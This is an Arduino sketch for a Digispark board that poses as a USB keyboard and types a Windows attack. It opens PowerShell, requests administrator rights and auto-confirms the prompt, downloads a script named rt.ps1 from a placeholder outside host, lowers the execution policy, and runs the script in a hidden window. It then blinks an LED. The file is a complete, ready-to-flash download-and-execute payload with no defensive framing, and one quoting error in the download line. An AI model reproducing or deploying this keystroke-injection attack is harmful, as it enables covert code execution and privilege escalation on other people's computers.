#include "DigiKeyboard.h"
void setup() {
    // buffer clear
    DigiKeyboard.sendKeyStroke(0);

    // win+R -> powershell
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(550);
    DigiKeyboard.println("powershell");
    DigiKeyboard.delay(550);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // escalate privileges and close current PS instance
    DigiKeyboard.println("Start-Process powershell -Verb RunAs; exit;");
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_RIGHT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // download payload
    DigiKeyboard.println("$client = new-object System.Net.WebClient");
    DigiKeyboard.println("$client.DownloadFile(\www.pathToWhereverYouAreHostingTheRTFile.com/rt.ps1\" , \"c:\\rt.ps1\")");
	
    
    // set permissions to remotesigned
    DigiKeyboard.delay(500);
    DigiKeyboard.println("set-executionpolicy remotesigned");
    DigiKeyboard.delay(500);
    DigiKeyboard.println("a");
    DigiKeyboard.println("exit"); //Close powershell

    // new powershell in hidden mode -> execute payload
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(750);
    DigiKeyboard.println("powershell.exe -WindowStyle Hidden -File c:\\rt.ps1");

    // initialize pinout for blink
    pinMode(1, OUTPUT); 
}


void loop() {
    digitalWrite(1, HIGH);
    delay(300);
    digitalWrite(1, LOW);
    delay(300);
}